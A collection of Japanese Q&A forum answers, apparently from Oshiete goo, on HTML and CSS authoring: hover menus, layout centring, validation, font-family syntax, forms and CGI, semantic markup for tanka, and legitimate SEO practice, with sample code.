　HTMLとスタイルシートだけなら、とっても簡単・・preにしてある。textareaでもよいが・・コピーさせるならpreのほうが良いでしょう。ただし、:hoverの親コンテナブロックと接していることが必要です。 [HTML4.01strict] ★Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) ★W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) 　で検証済みです。ＳＥＯとしても問題ないでしょう。 ☆タブは＿に置換してありますから戻すこと。原理を示すだけで細かい設定はしてない。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- ol,li{display:block;list-style:none;margin:0;padding:0;} ol li{width:10em;border:solid 1px gray;} ol li ol{display:none;margin-left:5px;} ol li:hover ol{display:block;} ol li:hover ol li ol{display:none;} ol li:hover ol li:hover ol{display:block;} ol li:hover ol li:hover ol li ol{display:none;} ol li:hover ol li:hover ol li:hover ol{display:block;} ol li:hover ol li.answer pre{ ＿position:absolute;top:60px;left:150px; ＿height:400px;width:400px;padding:0.5em 1em; ＿background-color:white;z-index:10; ＿border:ridge 4px gray;＿overflow:auto; } --> ＿</style> </head> <body> ＿<h1>サンプル</h1> ＿<ol> ＿＿<li>あ行 ＿＿＿<ol> ＿＿＿＿<li>あ ＿＿＿＿＿<ol> ＿＿＿＿＿＿<li>あい ＿＿＿＿＿＿＿<ol> ＿＿＿＿＿＿＿＿<li class="answer"> ＿＿＿＿＿＿＿＿＿<pre>藍 濃い青</pre> ＿＿＿＿＿＿＿＿</li> ＿＿＿＿＿＿＿</ol> ＿＿＿＿＿＿</li> ＿＿＿＿＿＿<li>あお ＿＿＿＿＿＿＿<ol> ＿＿＿＿＿＿＿＿<li class="answer"> ＿＿＿＿＿＿＿＿＿<pre>青 Blue</pre> ＿＿＿＿＿＿＿＿</li> ＿＿＿＿＿＿＿</ol> ＿＿＿＿＿＿</li> ＿＿＿＿＿＿<li>あか ＿＿＿＿＿＿＿<ol> ＿＿＿＿＿＿＿＿<li class="answer"> ＿＿＿＿＿＿＿＿＿<pre>赤 red</pre> ＿＿＿＿＿＿＿＿</li> ＿＿＿＿＿＿＿</ol> ＿＿＿＿＿＿</li> ＿＿＿＿＿</ol> ＿＿＿＿</li> ＿＿＿＿<li>い</li> ＿＿＿＿<li>う ＿＿＿＿＿<ol> ＿＿＿＿＿＿<li class="answer">うぐいす ＿＿＿＿＿＿＿<pre>鶯色 鶯色（うぐいすいろ）とは灰色がかった緑褐色を言う。 また、抹茶色に近い柔らかな黄緑色を連想する人もいる。 前者はウグイスの羽に忠実に取材した色であり、英語の オリーヴグリーン（olive-green未成熟のオリーブの果実の色） に近いが、後者はウグイスと同じく春先によく見かけられる 野鳥のメジロの羽の色と混同されている。 また江戸時代中期には前者の鶯色がより茶色味がかった鶯茶が 女性の普段着の色として大流行したため、当時「鶯色」といえ ばこちらの色を指す。 Wikipediaより</pre> ＿＿＿＿＿＿</li> ＿＿＿＿＿</ol> ＿＿＿＿</li> ＿＿＿＿<li>え ＿＿＿＿＿<ol> ＿＿＿＿＿＿<li class="answer">えんじ ＿＿＿＿＿＿＿<pre>臙脂 臙脂で染めた濃い紅色。黒みを帯びた赤色。</pre> ＿＿＿＿＿＿</li> ＿＿＿＿＿</ol> ＿＿＿＿</li> ＿＿＿＿<li>お ＿＿＿＿＿<ol> ＿＿＿＿＿＿<li class="answer">おれんじ ＿＿＿＿＿＿＿<pre>オレンジ Orengee</pre> ＿＿＿＿＿＿</li> ＿＿＿＿＿</ol> ＿＿＿＿</li> ＿＿＿</ol> ＿＿</li> ＿</ol> </body> </html>
テーブルを使用しているならば nowrap も一緒に指定してみてください。 参考URL：http://www.tagindex.com/html_tag/table/td_nowrap …
サイトリンクと言うもので、googleが機械的に作成してくれます。 サイトにサイトマップがあると、それを利用して作成される場合もありますが、元々は自動作成なので、googleが(機械的に)必要と思うサイトにしか表示されません。 　ただし、サイトリンクの内容が不適切な場合は、修正することは可能です。 　ウェブマスター googleのトップページから下の{googleについて}からたどってください。 　{googleについて} 　　→サイトオーナーの方への{ウェブマスターセントラル} 　　　→ウェブマスター ツール ヘルプ 　　　　→検索結果 　　　　　→検索結果 　　　　　　→サイトリンク ( https://www.google.com/support/webmasters/bin/an … ) 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから サイトリンクは、ユーザーの役に立つと Google が判断した場合のみ、検索結果に表示されます。サイトの構造が原因で Google のアルゴリズムが適切なサイトリンクを見つけることができない場合や、サイトリンクとユーザーのクエリに関連性がないと思われる場合、サイトリンクは表示されません。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［サイトリンク - ウェブマスター ツール ヘルプ( https://www.google.com/support/webmasters/bin/an … )］より 　→サイトマップの作成 - ウェブマスター ツール ヘルプ ( http://www.google.com/support/webmasters/bin/ans … ) 　いずれにしても、ウェブマスター/サイトオーナーならウェブマスターヘルプはしっかり目を通しておきましょう。
＞「リキッドスタイル」初めて知りました。試してみたいと思います。 　たとえば、 リストのコーディングについて - Webデザイン・CSS - 教えて！goo ( http://oshiete.goo.ne.jp/qa/7040375.html ) 　のような形になります。ウィンドウ幅450px以上に対応しています。並び方が変わったとしても問題ないように作ります。
こちらで確認してください。 フォームの送信先を上記にして送信すると環境変数の値が補足できます。 Enviroment Variable and FORM,COOKIE ( http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/test. … )
カテゴリー違いです。 ★ホームページ作成ソフト - 教えて！goo ( http://oshiete.goo.ne.jp/category/560/ ) で聞かれたほうが良いでしょう。 　テキストエディタで直接HTMLやスタイルシートを訂正されるなら、こちらのカテゴリーでそのソースを含めて質問されても良いですが???
あ、ローカル環境のJavascript制御を失念してました。それはあるかも。 ＃10さんの言うように、サーバーにUPすれば正常に動作するかもしれません。 ただ、文字コード制御のMETA構文が書かれていないので、文字化けするかも。 改行コードや文字コードの話は、ここ数年のブラウザではこれが原因で動かなくなるということはないので気にしないで大丈夫です。もっとも１つ1つのタグやスクリプトの中に改行が入ってしまうと動かなくなってしまう可能性はありますが。またＨＰ作成に関してはメモ帳でも問題はありませんが、メモ帳は少し機能的には不十分なので、もう少しＨＰ作成を本格的に進めようと思うようになったら、ほかのエディターに乗り換えた方がよいかもしれません（オススメのものは後述します）。 とりあえず、ルール的な話をしても一向に完成しないと思うので、質問者さんが書かれているソースを元に少し必要な情報を書き足したソースを書いてみました。これを以下のような手順で操作してみてください。 (1)メモ帳を新しく開く (2)下のソースを全文貼り付ける（画像名のところは修正してください） (3)「ファイル」→「名前をつけて保存」 (4)ファイル名を「test.html」（テストの部分は任意です）にし、ファイルの種類を「すべてのファイル」を選択、文字コードを「UTF-8」を選択して保存 (5)保存した場所にHTMLファイルができるので、これを開いてみる たぶん、これでいけるかと、もしかしたらオンラインにUPしないと動かないかもしれませんが。 ---------------↓ここの下から↓----------------- <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> <html lang="ja"> <head> <title>タイトル名</title> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta http-equiv="Content-Style-Type" content="text/css"> <meta http-equiv="Content-Style-Type" content="text/javascript"> <style type="text/css"> body { background: src(img/背景画像の名前.gif) repeat; } </style> </head> <body> <div align="center"> <br><br> <a href="リンク先URL"><IMG src="img/画像1.gif" onMouseOver="this.src='img/画像2.gif'" onMouseOut="this.src='画像1.gif'" border="0"></a> <br><br> </div> </body> </html> ---------------↑ここの上まで↑----------------- 一応、補足というかアドバイスですが、HTMLには文字化け対策として最低限文字コードの制御構文は書いた方がよいです。 今回のようにUTF-8で保存したなら、 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> と<head></head>の間に入れておきます。これで文字化けが防げるようになります 参考 http://www.htmq.com/html/meta.shtml 参考までに、私が比較的良いと思っている無料のHTMLエディタは以下のようなものがあります。 【メモ帳の拡張版的なエディタ】 へてむるクリエイタ～ http://hosiken.jp/dev/hetecre/ TeraPad http://www.forest.impress.co.jp/lib/offc/documen … サクラエディタ http://sakura-editor.sourceforge.net/ ※自分は「CresentEVE」というソフトを使ってますが、ちょっと上級者向けかも http://www.kashim.com/eve/ 【ワードを操作する感覚で簡単にHPが作れるWYSIWYGというシステムの作成ソフト】 ※ただ、このWYSIWYGというシステムは、市販の製品も含めて実用レベルとは言いがたいので、できるだけ前者でタグを自分で打って作れるようになった方がよい http://freesoft-100.com/review/alphaedit.php
%指定では .w202 {width:21.3%;} .w112 {width:11%;} .w200 {border-style:none;width:99.5%;margin-top:0.3em;} <table summary="古文書(駿河竜爪山由来)の写真"><col span="1" class="w202"><col span="1" class="w112"><col span="1" class="w202"><col span="1" class="w112"><col span="1" class="w202"><col span="1" class="w112"><tbody> <img src="../kan/syou/keidai2.jpg" alt="keidai2_d.gif" class="w200"> 実際に使用例ですが 段組で作成の場合でも％指定可能ですが 文字も画面サイズにより変更の場合は、JavaScriptにより文字サイズの変更が必要ですが。 <script Language="JavaScript"><!--は、誤りでは、ないですか<script type="text/javascript"><!--でないとフリーソフトAnother HTML-lint gatewayでエラーになりますが summary="古文書(駿河竜爪山由来)の写真"もフリーソフトAnother HTML-lint gatewayでエラー対策で記述していますが
その場合は、CSS3だね。 http://builder.japan.zdnet.com/off-topic/sp_epub …
<meta name="viewport" content="width=960px, （以下略） でどうでしょうか。 何も指定しないほうが安定する事もあります。
ありですけど、スマホのすべてが縦型320px、横型480pxではありません。 7inch型とか、将来iPhone5が出て解像度が上がったら繰り返してしまいますよね。（auto指定の場合） ちょっとどういう背景画像なのかわからないので答えようがないのですが、例えば背景画像の背景を同色で引いておき、その上に1枚で見せたい画像をセンタリングさせるとか違う方法もあるのではないかと思います。 画像を見せていただければもう少し助言できるとは思いますが・・・
position: absolute 限定であれば次の方法が一般的です。 div#inner { position: absolute; top: 0px; /* left: ?px */; left: 50%; width: 800px; /* margin: 0px auto 0px auto; */ margin-left: -400px;/* 800/2*(-1) */ } 1 親ボックスの左から 50% 位置に置く。（left: 50%） 2 自ボックスの幅の半分、左に寄せる。（margin-left: -400px）
両方使えばいいでないか・・・。 表示だって別にページ再構成しなくても、JavaScriptでバックグラウンド通信して直接書き換えればよい。 そうすればサーバサイド側も最低限の演算・出力で済むし、JavaScriptも通信と表示だけで済むわけだ。 #こういうのは思想の話したらダメぞ。 #ちなみにバーナーズ・リーな。
>>PCでIEも入っているのでそちらで開くと、きちんとdiary.gifの画像をクリックした場合targetB(下のページ)には新のアメーバのブログが表示されました。 ということは、忍者ホームページにアップしたＨＴＭＬは正常に変更されているということだと思います。 となると、Firefoxに前のHTMLのキャッシュが残ってしまっていて、ブラウザが前のキャッシュをそのまま表示しているためかと思います（サーバーにUPしたものでなく、PCに残っているキャッシュデータを読み込んでしまっているということ）。 >>ブラウザ履歴を削除したり とありますが、キャッシュは削除しましたか？ とりあえずFirefoxのバージョンがわかりませんので、3.6の場合の参考ＨＰ挙げておきます http://www.sakyou.com/ManualShop/Internet/web/05 … 「Firefox キャッシュの削除」で検索すれば他のバージョンのものの大量に出てると思います。 そこで、ＨＰを見ている閲覧者も同じような症状になっている可能性もありますので、ＨＰのトップページか掲示板・旧ブログあたりに新しいブログへのリンクをしばらくの間貼っておいたほうが良いかもですね。
スタイルシートに誤りがあります。 font-family:には必ずキーワードが必要です。キーワードは""で囲んではいけません。 　その他のファミリ名は、日本語や空白を含むものは""で囲んで羅列することが必要です。 　具体的には 　　font-family:"HGP創英角ゴシックUB","HG創英角ゴシックUB","ＭＳ Ｐゴシック","Osaka",sans-serif; 　font-size:にpxを指定してある場合(例35px)、画面の解像度を96dpiとすると、9.5mm程度で、ptに直すと27ptになります。これを「1ポイント小さく」、26pt(9.2mm)にしても、ほとんどわからないでしょう。 　ptは、出力メディアがprintでない場合は、デフォルトのサイズを参照したほうが訪問者に優しいです。目の悪い人はフォントを大きくしていたり、携帯端末の場合は文字が小さいです。 HTMLを下記のようなものだとします。 <body> 　<div class="header"> 　　<h1>サイト見出し</h1> 　　<div id="abstract"> 　　　<p>html作成<span>でお</span>尋<span>ねしたい</span>事<span>があります</span>。</p> 　　　<p>文章中<span>のかな</span>文字<span>だけを</span>1ポイント小<span>さくする</span>事<span>は</span>可能<span>でしょうか</span>？ <span>もし</span>、可能<span>であれば</span>、<span>やり</span>方<span>を</span>教<span>えて</span>下<span>さい</span>。</p> 　　</div> 　</div> </p> 　日本語正規表現が扱えるテキストエディタで、 ([あ-ん]+) →[置換]→<span>\1</span> 　と置換するのが楽でしょう。 ついで、CSSで div.header p{font-size:2.5em;text-align:center;} div.header p span{font-size:0.9em;}
HTML <table class="t100tbl"> 　　<tr> 　　　　<td class="td1"> 　　　　　<div id="menu"> 　　　　　　　<table class=t100tbl><!-- ;は余分 --> 　　　　　　　　　<tr> 　　　　　　　　　　　<td class=tpdg> 　　　　　　　　　　　　　<a href=""><!-- ここ抜けてませんか？ --> 　　　　　　　　　　　　　　　<img src="../Images/aaa.png" alt="aaa" 　　　　　　　　　　　　　　　　name="aaa" class="bdr" /> 　　　　　　　　　　　　　</a> 　　　　　　　　　　　</td> 　　　　　　　　　</tr><!-- \n";これも --> 　　　　　　　</div><!-- 対応するdivがありません。 --> 　　　　　</td><!-- 対応するtdがありません。 --> 　　　　　　・ 　　　　　　・ 　　　　　　・とりあえず、 Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … )などで構文チェックをしてください。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから メモ: CSSスタイルシートを意図した通りに機能させるには、正しい文書解析木が必要です。つまり、正当なHTMLを用いるべきです。. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［W3C CSS 検証サービス( http://jigsaw.w3.org/css-validator/#validate_by_ … )］より 　さて、とりあえず td.tpdg img{ display:block;}を入れてみてください。これでセルの内寸に合わせてwidthが決まり、heightは、本来のサイズに合わせて伸縮されるはずです。 　 　
文法エラーという場合、大きく二種類あります。 ・構文（整形式）エラー。タグの書き方が正しいか。 ・内容（妥当性）エラー。要素の配置・属性値が正しいか。 ・HTML 4.0 は、どちらも正しくなければなりませんでした。 ・XHTML は、構文さえ正しければ、内容は後回しにできます。 ・HTML5 は、内容さえ読み取れれば、構文が壊れていても何とかします。 img 要素の終了タグの有無（"/>" は NET と呼ばれる終了タグ省略です）は構文レベルの問題ですので、XHTML では致命的エラーとなります。 さて、文法エラーについて Google は何と言っているか。 http://www.google.com/support/webmasters/bin/ans … | 正当な HTML の使用を推奨しますが、Google がサイトをクロールしてインデックスに登録する方法には影響しません まあ、そうでしょう。残念なことに構文エラー文書が多いウェブで、構文エラーの時点で撥ねていては検索商売が成り立ちません。一応、構文エラーからの回復は、そこそこ簡単にできます（回復された文書の正しさはともかく）。 検索商売としては、文書の内容を読み取ることが至上目的となります。Google が深く関わっている HTML5 が上記のようになったのも、頷ける話でしょう（実のところ、HTML5 には内容に関しては相当厳しいです）。 あとは心情的な話です。仮にも XHTML を宣言した文書が、XHTML としての存在意義（構文エラーさえなければ、どんな XML パーサにも渡せること）を台無しにするようなことを見過ごして良いのか、という。 --- 余談ですが、Google、MS、Yahoo など検索運営会社が Schema.org というのを立ち上げました。そこで定義されている語彙を使うには、XHTML か HTML5 であった方が良いです。HTML 4.0 では語彙拡張ができませんので。この意味では XHTML を使うメリットはまだあります（ちゃんと使えれば、ですが）。 XHTML 1.0 と HTML 4.0 では微妙な変更点があって、DOM 構築にも関わってくるのですが、この辺は HTML5 である程度吸収されてはいます。
}の位置がおかしいためエラーになります。それが原因かもしれません。 →W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … ) 　しかし、そんな煩雑なHTMLもCSSも書きません。途中で見るのを止めました。多分ご自身でも「わけわかめ」じゃないかと思います。 　コメントや重複した改行を除いても80行を超えている、せいぜい特定のブロックのスタイルシートはテキストエディタでみて40行程度に抑えないと、後日のメンテナンスが大変です。(今でさえ大変なのに・・) 　スタイルシートを簡潔に書き、かつ適用させるためには、HTMLも正しくなければなりません。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから メモ: CSSスタイルシートを意図した通りに機能させるには、正しい文書解析木が必要です。つまり、正当なHTMLを用いるべきです。. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［W3C CSS 検証サービス( http://jigsaw.w3.org/css-validator/#validate_by_ … )］より 　スタイルのためだけにidをつけてしまうと、それ(一意セレクタ)自体の詳細度がb=1なので、カスケーディングが使いにくくなります(CSSとはカスケーディングが命)。 ・基本的に同じプロパティは一回しか書かない。 　セレクタのグループ化をする。 　継承されるものは継承させる。そのために詳細度を計算する癖をつけましょう。 ・プロパティの書き方を工夫する。 　同じ性質のプロパティは、一行ないしまとめておく。 　プロパティは一括指定を使う。 ・きちんと接続詞、タイプを記述して他の部分に影響を与えないようにする。 　.class名だと、CSS2.1では*(全称セレクタ).class名と判断されます。p.strongとblock.strongが区別されない。 　区別しなくてよいときだけ、*.class名 と書き、通常はタイプセレクタと併用する。 ・HTMLは文書構造を的確に示すこと 　それによって、スタイルシートを編集するときにHTMLを開かなくてもよくなります。 　divやidの名称は文章の構造を示すものにする。(リンクの終端でもないのに不必要なIDはつけない) 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［7.5.4要素のグループ化: DIV要素とSPAN要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 下記がサンプルになります。 ★ウィンドウ幅は様々です。固定したらダメなのでi-phone,i-padからとても広いウィンドウにも合わせてあります。 　これはとても重要です。--ひとつのHTMLが、携帯電話も読み上げブラウザも展示端末もで利用できることが最大の利点なのですから 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきである・・・【中略】・・・なぜならただ1種類の文書しか作る必要がなくなるからだ。・・・【中略】・・・ HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。・・・【略】・・・ ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［2.2.1 HTMLの略歴( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　ウィンドウ幅を変えてご覧ください。 ★HTMLを見なくても、スタイルシートを読むだけでどこの何について指定しているかわかるはず 　これで行数は（同じ性質のプロパティはまとめてありますが）、24行しかありません。 ★以下で検証済みです。 →Another HTML-lint gateway ( http://openlab.ring.gr.jp/k16/htmllint/htmllint. … ) →W3C CSS 検証サービス ( http://jigsaw.w3.org/css-validator/#validate_by_ … )オプションでCSS3を選択 　※CSS2.1の場合、 　div.nav ul li ol li:last-child a{}をdiv.nav ul li ol li+li+li a{}に変更すること。aの属性セレクタ a[href="profile/recruit.html"]を使っても良いですが、いずれも古いブラウザIE6以前は未対応です。それらに対応させるためには、aにclass名をつけると良いでしょう。 ※タブは＿に置換してあります。元のタブに戻してテストしてください。具体的な値は、あなたのイメージに合わせて変更してください。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css" media="screen"> <!-- div.nav{ ＿height:20px;;width:auto; ＿line-height:20px; ＿margin:34px auto; ＿min-width:450px;max-width:650px; } div.nav ul,div.nav ol,div.nav ul li{ ＿display:block;list-style:none; ＿margin:0;padding:0; } div.nav ul{margin:0 40px 0 0;} div.nav ul li{height:100%;width:30%;float:left;} div.nav ul li ol li{float:none;width:100%;} div.nav li a{ ＿display:block; ＿width:100%;height:100%; ＿text-align:center; ＿background-image:url(../images/navi/catalog.jpg); } div.nav ul li a:hover{background-image:url(../images/navi/catalog_r.jpg)} div.nav ul li ol li a{background-image: url(../images/navi/tops.jpg);} div.nav ul li ol li:last-child a{background-image: url(../images/navi/bottoms.jpg);} div.nav ul li ol li a:hover{background-image: url(../images/navi/tops_r.jpg);} div.nav ol{display:none;} div.nav ul li:hover ol{display:block;} --> ＿</style> </head> <body> ＿<h1>サンプル</h1> <div class="nav"> ＿<ul> ＿＿<li><a href="proflie">会社概要</a> ＿＿＿<ol> ＿＿＿＿<li><a href="profile/place.html">所在地</a></li> ＿＿＿＿<li><a href="profile/history.html">歴史</a></li> ＿＿＿＿<li><a href="profile/recruit.html">採用</a></li> ＿＿＿</ol> ＿＿</li> ＿＿<li><a href="/product">製品</a></li> ＿＿<li><a href="/contactUs">問合せ</a></li> ＿</ul> </div> </body> </html>
＞<form>を使うとＣＧＩとかが実行できますよね。 　いいえ、formを使うと、サーバーにデータを送信することが出来ると言うことです。 17.1 フォームの概説 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ＞ボタンとかで<form>のないページもあるのですが、 　<input type="button">は必ず<form></form>内に無ければなりません!!! 　しかし、外見上ボタンのように見せる方法はたくさんあります。 ＞２点目にお聞きしたいのがＣＧＩの実行の仕方です。submitボタンがその装置のようですけど、 　form内でしたら、submitだけでなくbuttonなどもCGIに対してデータを送ることが出来ます。form外でも、リンクなり様々な方法でCGI(サーバーにある)にデータを渡せます。ここは誤解があるようですが、CGI(Common gateway interface)は、サーバー上で動作するプログラムで、単にformのデータを受け取って処理するだけでなく、サーバーに対して行われるすべての要求を処理することが出来ます。単純にリンクをたどってくるだけでも、ページやメールに貼り付けてある画像を読もうと開いただけでも・・ ＞これ以外にCGIを実行させる仕組みってありますか。 　上の説明 ＞Javascriptのonclickのような使い方の方が分かり易くていいと思うんですけど。 　文法的にはjavascriptのほうが難しいかも(^^) 　たとえば、 　　http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/test. … 　のリンクをたどるだけで・・・ 　
後を絶たないですね。 SEOとは何かご存知ですか？検索エンジン最適化といって、検索エンジンが的確に情報を収集できるようにすることです。情報とは、内容はもとより、多くのサイトからリンクされているとかです。ここで言う多くのサイトには、「サイト順位やページランクを上げる目的のサイトは含みません。」 　検索エンジンは、製作者のためではなく、ウェブで情報を得ようとしている人のためにだけ存在すると言う基本を忘れてませんか？。 　もし、検索者の期待した情報が得られない、価値の低いサイトを検索結果として表示すれば、それは利用者の期待に反することになります。そのために、そのようなサイトをSPAMとして追放するように出来ています。あなたが検索エンジン開発者なら、そうプログラムするでしょう。 Google 　→[googleについて](下にある) 　　→サイトオーナーの方への「ウェブマスター セントラル」 　　　→ウェブマスター関連のリンクの「ウェブマスター向けガイドライン」 　　　　→「品質に関するガイドライン」 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから サイトの順位や PageRank を上げることを目的としたリンク プログラムに参加しない。特にウェブ スパマーや不正なウェブサイトへのリンクは行わないでください。これらのリンクにより、サイトのランクが下がることがあります。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプより 　はっきり言うと、「サイトの順位や PageRank を上げることを目的とした」一切の行為は、SPAMとみなされる可能性があると言うことです。 　そんなことより、 ・内容の充実 ・文書構造に従った正統なHTMLをつくること。 　　＝検索エンジンがそのサイトの内容を適切に把握できること 　以外の「サイトの順位や PageRank を上げる」方法はないということです。 　私は、相互リンクの依頼が届いても 「ありがとうございます。当方のサイトに貴サイトの利用者にとって有益なページがありましたら、自由にリンクしてください。記事の特定部分へのリンクに必要ならページアンカーを付けさせていただきます。 　なお、当サイトから貴サイトへのリンクについは、貴サイトを拝見させていただいて、当サイト利用者にとって有益だと判断した場合に限り、リンクをさせて頂くかもしれませんが、原則として依頼に基づくリンクには対処していません。」 　と丁重にお断りしています。 　でも、私のサイトはそのテーマで検索すれば、必ず最初のページの上位に表示されます。検索エンジンへの登録も、相互リンクもなにもしていません。 　googleで、それらのページへのリンクしているページを検索すると、私が知らない何十と言うサイトが引っかかります。 [正統なマークアップ] 　無関係なキーワードを並べたりはしません。 　きちんとセマンティクなマークアップをしています。 <body> 　<div class="article"> 　　<div class="header"> 　　　<h1>見出し</h1> 　　　<div class="section" id="abstract"> 　　　　<h2>要約</h2> 　　　</div> 　　<div> 　</div> 　<div class="section"> 　　<h2>見出し</h2> 　</div> 　<div class="footer"> 　</div> </body> 　とか、最低限HTML4.01の仕様書には従っています。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［The global structure of an HTML document (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　これらのclass名は、googleは理解していますし、HTML5ではセマンティク要素として独立します。 　本当のＳＥＯとは、 ・正統なHTMLを書くこと。 ・内容を充実させること　ロングテールであって良い。 　それ以外は無いでしょう。 　わたし自身、ＳＥＯを生業にしていますから断言できますが、高価であるか安価であるかを問わず、相互リンクは逆効果どころか、ＳＰＡＭとみなされて検索エンジンのデータベースから永久追放される危険をはらんでいます。悪質な業者は、それはそれで、もっと高価なサービスを売り込み続けるようです。相手が気づくまで・・・。 　
すみません、今更ながら、全面撤回します。 <br>の項目を読み直すと、 > http://www.w3.org/TR/2011/WD-html5-20110525/text … >br elements must be used only for line breaks that are actually part of the content, as in poems or addresses. 改めて、 >as in poems or addresses 詩と住所に使用する（「など」という表現ではない）、ですので、 そのままの文字通りに解釈すれば、 > 質問文中 >例えば、見出しや定義リストの一部（ＴＤ要素）で >複数言語での表記を併記したい場合 この２つの条件下において、 たとえ行を分けたい場合でも、<br>を使えないという事になります。 ------------ セマンティックウェブについて、 自分の意見がうまくまとまらないのですが、、、 タグの種類が少なすぎる物を、それ以外の規格を利用したり、作ったりして区別させようという物だと思います。 (1) 句を<p>で区切る <div class="article tanka"> <div class="section kaminoku"> <p class="shoku">秋の田の</p> <p class="dai2ku">かりほの庵の</p> <p class="dai3ku">とまをあらみ</p> </div> <div class="section shimonoku"> <p class="dai4ku">わが衣手は</p> <p class="kekku">露にぬれつつ</p> </div> </div> (2) 上の句と下の句を<br>で区切り、句を<span>で区切る場合 <div class="section"> <p class="tanka"> <span class="kaminoku"> <span class="shoku">秋の田の</span>　<span class="dai2ku">かりほの庵の</span>　<span class="dai3ku">とまをあらみ</span> </span><br> <span class="shimonoku"> <span class="dai4ku">わが衣手は</span>　<span class="kekku">露にぬれつつ<span> </span> </p> </div> (3) 上の句と下の句を<p>で区切り、句を<span>で区切る場合 <div class="section"> <p class="kaminoku"> <span class="shoku">秋の田の</span>　<span class="dai2ku">かりほの庵の</span>　<span class="dai3ku">とまをあらみ</span> </span></p> <p class="shimonoku"> <span class="dai4ku">わが衣手は</span>　<span class="kekku">露にぬれつつ<span> </p> </div> 私は、 句は段落ではありませんから、（<span>を書かない場合でも）どの書き方も正しいと思います。 多くの人が、２番目の方法（下の句を全角スペースでインデントする）か、３番目の方法（下の句をスタイルシートでインデントする）を使うのではないでしょうか。 HTML4、XHTMLでは、<span>は「その他の要素」という意味がありますが、 HTML5では、<span>に意味はありません。 もしHTML5で書くのであれば、２番目、３番目は、HTMLの文法上は句が別れていない事になります。 （さらに、全角スペースで区切るのは、文法的に不正だと思います。） 人が見たときではなく、「コンピューターに句を区別させる」という目的があるのであれば、 1番目の例が適していると思いますが、 そうでなければ、２番目、３番目でもいいと思います。 短歌や俳句は段落ではありませんので、<p>でいいのかということになると思いますが、 HTMLでは、他に適した要素がなければすべて<p>です。 段落ではない物のために要素を作るように要求しましたが、却下されました。 詩の段落（書籍などでは空業で区別する）と句は違うと思いますし、広告や商品パッケージにあるような文字の部分も段落ではないと思うのですが、、、 「<p>要素は段落やparagraphではなく『<p>要素である』」という考え方にした方がいいのかもしれません。
http://www.mdn.co.jp/di/articles/2075/?page=2
JavaScriptの用意が出来ているとのことですが, 実行したい関数が function hogehoge(){ なんちゃら } のように準備できているということでいいでしょうか? そういうことであればonclickという記述を追加して, そこに関数名を書いてください. 上の例だと <img src="画像.jpg" onclick="hogehoge()"> とすればOKです.
えーとまず、一番上の質問から・・・ ■これは削除しても大丈夫なものでしょうか？ <!--[if lt IE 8]>から<![endif]-->までは、IE7以下の場合という意味です。IE７以下の場合 <div style=' clear: both; text-align:center; position: relative;'><a href="ttp://www.microsoft.com/windows/internet-explorer/default.aspx?ocid=ie6_countdown_bannercode"><img src="ttp://www.theie6countdown.com/images/upgrade.jpg" border="0" alt="" /></a></div> を表示するようにしているソースですね。 次の<!--[if lt IE 9]>から<![endif]-->はIE８以下の場合 <script type="text/javascript" src="js/html5.js"></script>　（HTML５が使えるようにして） <link rel="stylesheet" type="text/css" media="screen" href="css/ie.css">　（IE用のCSSを適用させる） という意味ですね。 【結論】 上のほうの、<!--[if lt IE 8]>から<![endif]-->までは消してもいいでしょう。 下のほうの、<!--[if lt IE 9]>から<![endif]-->までは消すと表示がブラウザによって崩れる可能性があります。 次！ ■このように列をずらしているのにはどのような理由があるのでしょうか？ それは見やすくするためです。それ以上でも以下でもありません。 インデントはあってもなくてもいいですよ＾＾ ビルダーで表示が変わる理由はよくわかりません。ビルダーがおかしいと思います。 次！ 